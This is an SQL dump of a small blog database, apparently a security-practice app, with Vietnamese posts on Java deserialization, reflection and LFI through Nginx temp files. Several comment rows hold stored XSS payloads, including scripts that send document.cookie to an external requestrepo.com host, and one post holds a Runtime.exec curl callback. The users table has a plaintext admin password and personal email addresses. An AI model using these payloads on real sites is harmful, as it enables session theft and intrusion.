-- phpMyAdmin SQL Dump
-- version 5.2.0
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Oct 01, 2023 at 08:02 PM
-- Server version: 10.4.27-MariaDB
-- PHP Version: 8.0.25

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `blog`
--

-- --------------------------------------------------------

--
-- Table structure for table `comments`
--

CREATE TABLE `comments` (
  `id` int(11) NOT NULL,
  `authorname` varchar(50) NOT NULL,
  `postid` int(11) NOT NULL,
  `content` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `comments`
--

INSERT INTO `comments` (`id`, `authorname`, `postid`, `content`) VALUES
(1, '1', 1, 'oke oke'),
(2, '7', 1, 'abc'),
(3, 'k', 1, 'abc'),
(4, 'k', 1, '<script>alert(1)</script>'),
(5, 'k', 2, 'aaa'),
(6, 'k', 2, 'ncc'),
(7, 'k', 2, 'helo\r\nabc'),
(8, 'i', 2, '123'),
(9, 'i', 3, 'hay quá\r\n'),
(10, 'i', 3, 'script khai thác đâu'),
(11, 'i', 1, '123'),
(12, 'xyz', 3, '<script>alert(1)</script>'),
(13, 'xyz', 3, '<script>location.href=\"http://1pihpji6.requestrepo.com?c=\"+document.cookie</script>'),
(14, 'xyz', 2, '<script>location.href=\"http://1pihpji6.requestrepo.com?c=\".concat(document.cookie)</script>'),
(15, 'i', 1, 'abc'),
(16, 'i', 1, 'hello\r\n');

-- --------------------------------------------------------

--
-- Table structure for table `posts`
--

CREATE TABLE `posts` (
  `id` int(11) NOT NULL,
  `title` varchar(50) NOT NULL,
  `content` text NOT NULL,
  `authorid` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `posts`
--

INSERT INTO `posts` (`id`, `title`, `content`, `authorid`) VALUES
(1, 'Cơ bản về Java Deserialization', 'Trong Java, các object sẽ được lưu trữ vào bộ nhớ heap trong JVM. Vì vậy khi chương trình kết thúc tức là JVM dừng cũng có nghĩa là các object này sẽ bị mất. Vì vậy để có thể sử dụng lại object cũng như việc lưu trữ chúng hay việc chuyển chúng qua network thì cần có đến 2 quá trình serialization và deserialization.\r\n\r\nSerialization: Đây là cơ chế chuyển object sang dạng byte stream (mảng byte).\r\n\r\nDeserialization: Quá trình này ngược lại với trên là chuyển từ byte stream sang object.', 1),
(2, 'Java Reflection', 'Reflection là 1 API trên Java sử dụng để truy xuất, sửa đổi hành vì của fields, methods, classes, interfaces trong quá trình runtime. Điều này đặc biệt hữu ích khi không biết tên chúng tại thời điểm compile hay do server filter 1 số thứ.\r\n', 2),
(3, 'Kỹ thuật khai thác LFI thông qua Nginx temp files', 'Nginx cung cấp tính năng \"client body buffering\" để đọc client request body. Và nếu request body đó lớn hơn buffer thì toàn bộ body hoặc một phần có thể ghi vào temp file.\r\n\r\n\r\nTemp file sẽ được Nginx xóa sau khi nó mở. Tuy nhiên procfs có thể tham chiếu đến file đã xóa đó thông qua race.\r\n\r\nprocfs (proc file system) là một hệ thống tệp ảo sử dụng để cung cấp thông tin về các tiến trình đang chạy trên hệ thống.\r\n/proc/self/ chứa các tiến trình đang chạy, trong này thư mục fd/(chứa các symlink đến các file mở bởi tiến trình hiện đang thực thi có tên là các số tương ứng với số file descriptor).\r\n\r\n\r\nTrong ví dụ trên, hàm include() hay các hàm tương tự trong PHP sẽ không include được /proc/34/fd/15 vì nó tham chiếu đến file đã bị xóa là /var/lib/nginx/body/0000001368. Tuy nhiên lại bypass được bằng cách sử dụng /proc/self/fd/34/../../../34/fd/15 và sẽ thực thi nội dung /var/lib/nginx/body/0000001368.\r\n\r\n\r\n\r\n\r\n\r\n', 1),
(5, '<script>alert(1)</script>', 'Runtime.getRuntime().exec(\"curl http://1pihpji6.requestrepo.com\")', 1);

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `password` varchar(128) NOT NULL,
  `email` varchar(100) NOT NULL,
  `profile` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `email`, `profile`) VALUES
(1, 'admin', '123', 'caodchuong312@gmail.com', 'abc'),
(2, '3', '4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a', '1@1.1', '                                \r\n                            '),
(3, 'nguyen', '1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75', 'nguyen@gmail.com', NULL),
(4, '555', 'f9ff18b43dbc877949c6ab683430ab484712c48cba72b9b931aa311c6600d260a2e345439099b4c8fb343cca4c69518e4083336e94a8d6b3c1036f2f6fddfb40', '4@4.4', '                                \r\n                            '),
(5, '3', '3bafbf08882a2d10133093a1b8433f50563b93c14acd05b79028eb1d12799027241450980651994501423a66c276ae26c43b739bc65c4e16b10c3af6c202aebb', '3@3.3', NULL),
(6, 'admin', 'a321d8b405e3ef2604959847b36d171eebebc4a8941dc70a4784935a4fca5d5813de84dfa049f06549aa61b20848c1633ce81b675286ea8fb53db240d831c568', '4@4.4', '                                \r\n                            '),
(7, 'abc', 'ddaf35a193617abacc417349ae20413112e6fa4e89a97ea20a9eeee64b55d39a2192992a274fc1a836ba3c23a3feebbd454d4423643ce80e2a9ac94fa54ca49f', 'abc@abc.acb', NULL),
(8, '6', '3c9ad55147a7144f6067327c3b82ea70e7c5426add9ceea4d07dc2902239bf9e049b88625eb65d014a7718f79354608cab0921782c643f0208983fffa3582e40', '6@6', NULL),
(9, '8', 'f05210c5b4263f0ec4c3995bdab458d81d3953f354a9109520f159db1e8800bcd45b97c56dce90a1fc27ab03e0b8a9af8673747023c406299374116d6f966981', '7@7.7', 'a'),
(10, 'b', '2e96772232487fb3a058d58f2c310023e07e4017c94d56cc5fae4b54b44605f42a75b0b1f358991f8c6cbe9b68b64e5b2a09d0ad23fcac07ee9a9198a745e1d5', 'qqqqqqqqqqq@q.q', ''),
(11, 'ub', '58007911bf9f66711ef65e807b26c396a2d6fb464f4381520c5d4a575dbb81510f79d35e349604128a771acf2a117a2afdedc012d83b0eb822668aee0def4747', 'u@u.u', ''),
(12, 'o', 'cded74740d4bbfd4eb126d6de454b59e2d631f36c0ae0d2325b5e2be4da2befe792106b98422ad24c092e8f184b2ff4be0bbbcdcd278db6c2427533b2e9264d1', 'caodchuon7g312@gmail.com', 'jjjjjjjjjjjjjjjjjjj'),
(13, 'i', '507b553b106b1b9963b7affb34e5ed14bc1160bbdea24c094405b306bdcb2520823a0c7db7da4b51cf45cbdbad519eeca9affd7103b131d1e65a4974ba56b18d', 'i@i.i', ''),
(14, 'g', '19f142b018f307bfdf1c7009d15a29417c96d8678d2982eebce4961b2e67eeb118a8ebb1d75b70087c3e65bc793450e3fe4a10002befa2d038e5aed4796937f2', 'g@g.g', 'avx\r\n'),
(15, 'j', 'fcd8780493d9d11d29031b928a9da358a6f48627fff0cb7e80fb8107de86e0c365dc9cf8fe2fc05a6ce6d75803b78ac894d82a396042312a995ef63b5dd4dd11', 'jvmind@c.c', NULL),
(16, 'x', 'a4abd4448c49562d828115d13a1fccea927f52b4d5459297f8b43e42da89238bc13626e43dcb38ddb082488927ec904fb42057443983e88585179d50551afe62', 'x@x.x', NULL),
(17, 'n', '917148ec47923f2e0e3d73142ac4f94ec4c73078865ba6d29f0ea172cd6f4bf34db699af5c33535d3694d4aef91a11f916004d0382f794448a8550623d34c985', 'caodchuong312@gmail.com', NULL),
(18, 'm', 'f14aae6a0e050b74e4b7b9a5b2ef1a60ceccbbca39b132ae3e8bf88d3a946c6d8687f3266fd2b626419d8b67dcf1d8d7c0fe72d4919d9bd05efbd37070cfb41a', 'caodchuong312@gmail.com', NULL),
(19, 'xyz', '4a3ed8147e37876adc8f76328e5abcc1b470e6acfc18efea0135f983604953a58e183c1a6086e91ba3e821d926f5fdeb37761c7ca0328a963f5e92870675b728', 'xyz@gmail.com', NULL),
(20, 'chuong', 'f9ff18b43dbc877949c6ab683430ab484712c48cba72b9b931aa311c6600d260a2e345439099b4c8fb343cca4c69518e4083336e94a8d6b3c1036f2f6fddfb40', 'chuong@chuong.chuong', NULL);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `comments`
--
ALTER TABLE `comments`
  ADD PRIMARY KEY (`id`),
  ADD KEY `ForeignKey2` (`postid`),
  ADD KEY `ForeignKey1` (`authorname`);

--
-- Indexes for table `posts`
--
ALTER TABLE `posts`
  ADD PRIMARY KEY (`id`),
  ADD KEY `ForeignKey` (`authorid`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `comments`
--
ALTER TABLE `comments`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=17;

--
-- AUTO_INCREMENT for table `posts`
--
ALTER TABLE `posts`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `comments`
--
ALTER TABLE `comments`
  ADD CONSTRAINT `ForeignKey2` FOREIGN KEY (`postid`) REFERENCES `posts` (`id`);

--
-- Constraints for table `posts`
--
ALTER TABLE `posts`
  ADD CONSTRAINT `ForeignKey` FOREIGN KEY (`authorid`) REFERENCES `users` (`id`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
